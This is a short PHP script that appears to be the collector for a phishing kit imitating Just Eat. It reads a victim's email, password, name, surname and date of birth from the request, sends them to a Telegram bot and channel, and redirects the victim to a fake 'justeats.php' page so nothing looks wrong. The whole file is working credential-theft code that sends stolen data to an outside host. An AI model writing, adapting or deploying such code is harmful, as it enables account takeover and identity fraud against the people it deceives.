<?
define ('url',"https://api.telegram.org/botmybotidhere/");
$name = $_GET['name'];
$message = $_GET['message'];
$nname = $_GET['nname'];
$surname = $_GET['surname'];
$dob = $_GET['dob'];
$chat_id = '@justeatfullz';
$message = urlencode("Email:".$name."\n Password : ".$message."\n Name : ".$nname."\n Surname : ".$surname."\n DOB : ".$dob);
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");
header('Location:justeats.php');
?>
